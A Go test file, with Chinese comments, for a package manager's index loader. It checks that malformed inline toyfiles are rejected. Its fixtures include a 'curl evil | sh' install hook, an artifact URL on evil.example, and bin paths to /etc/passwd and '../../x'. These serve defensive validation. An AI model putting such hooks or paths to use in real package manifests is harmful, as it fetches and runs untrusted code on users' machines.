package index

import (
	"reflect"
	"strings"
	"testing"

	"github.com/Cirraya-LLC/toy/internal/toyfile"
)

const inlineGood = `
name = "tinyserve"

[bin]
tinyserve = "tinyserve"

[artifact]
"linux/amd64" = "tinyserve_{version}_linux_amd64.tar.gz"
`

func loadOne(t *testing.T, e Entry) (*Index, int) {
	t.Helper()
	idx := &Index{Version: Version, Packages: []Entry{e}}
	data, err := idx.Marshal()
	if err != nil {
		t.Fatal(err)
	}
	got, skipped, err := Load(data, "默认")
	if err != nil {
		t.Fatal(err)
	}
	return got, skipped
}

func TestLoadKeepsGoodInlineToyfile(t *testing.T) {
	got, skipped := loadOne(t, Entry{ID: "Derrity/tinyserve", Source: "github:Derrity/tinyserve", Toyfile: inlineGood})
	if skipped != 0 || len(got.Packages) != 1 {
		t.Fatalf("合法的内联 toyfile 被跳过了：skipped=%d packages=%d", skipped, len(got.Packages))
	}
	if got.Packages[0].Toyfile != inlineGood {
		t.Error("内联 toyfile 原文没被保留下来")
	}
}

// 坏的内联 toyfile 必须在 Load 就被判坏记录 —— 留到安装时才炸的话，
// 用户已经在等下载了，而报错会长得像上游仓库的问题。
func TestLoadSkipsBadInlineToyfile(t *testing.T) {
	bad := map[string]string{
		"不是 TOML":        "这不是 toml {{{",
		"没有 name":        "[bin]\nx = \"x\"\n[artifact]\n\"linux/amd64\" = \"a.tar.gz\"\n",
		"既没资产也没脚本":       "name = \"x\"\n",
		"bin 指向绝对路径":     "name = \"x\"\n[bin]\nx = \"/etc/passwd\"\n[artifact]\n\"linux/amd64\" = \"a.tar.gz\"\n",
		"bin 含 ..":       "name = \"x\"\n[bin]\nx = \"../../x\"\n[artifact]\n\"linux/amd64\" = \"a.tar.gz\"\n",
		"artifact 是 URL": "name = \"x\"\n[bin]\nx = \"x\"\n[artifact]\n\"linux/amd64\" = \"https://evil.example/x.tar.gz\"\n",
		"平台 key 不合法":     "name = \"x\"\n[bin]\nx = \"x\"\n[artifact]\n\"Linux\" = \"a.tar.gz\"\n",
		"有 hook 键":       "name = \"x\"\ninstall = \"curl evil | sh\"\n[bin]\nx = \"x\"\n[artifact]\n\"linux/amd64\" = \"a.tar.gz\"\n",
	}
	for name, tf := range bad {
		t.Run(name, func(t *testing.T) {
			got, skipped := loadOne(t, Entry{ID: "a/b", Source: "github:a/b", Toyfile: tf})
			if skipped != 1 || len(got.Packages) != 0 {
				t.Fatalf("这条内联 toyfile 应该被判坏记录：skipped=%d packages=%d", skipped, len(got.Packages))
			}
		})
	}
}

// 内联的那份走的是和上游一模一样的 ParseFrom，只是 Origin 不同。
func TestInlineParsesWithIndexOrigin(t *testing.T) {
	tf, err := toyfile.ParseFrom([]byte(inlineGood), toyfile.OriginIndex)
	if err != nil {
		t.Fatal(err)
	}
	if tf.Origin != toyfile.OriginIndex {
		t.Errorf("Origin = %q，想要 %q", tf.Origin, toyfile.OriginIndex)
	}
	up, err := toyfile.Parse([]byte(inlineGood))
	if err != nil {
		t.Fatal(err)
	}
	if up.Origin != toyfile.OriginUpstream {
		t.Errorf("Parse 的 Origin = %q，想要 %q", up.Origin, toyfile.OriginUpstream)
	}
	// 除了 Origin，两边解析结果必须一致 —— 校验没有第二条更松的路。
	tf.Origin, up.Origin = "", ""
	if !reflect.DeepEqual(tf, up) {
		t.Error("同一份字节按两种来源解析出了不同结果")
	}
}

// toy.toml 里自称 origin 不能生效：能自称就等于内联那份可以冒充上游，
// 而信任等级正是照着来源分档的。
func TestToyfileCannotDeclareItsOwnOrigin(t *testing.T) {
	_, err := toyfile.ParseFrom([]byte("origin = \"upstream\"\n"+inlineGood), toyfile.OriginIndex)
	if err == nil || !strings.Contains(err.Error(), "不认识的键") {
		t.Fatalf("toy.toml 里写 origin 应该被当成不认识的键拒掉，得到 %v", err)
	}
}
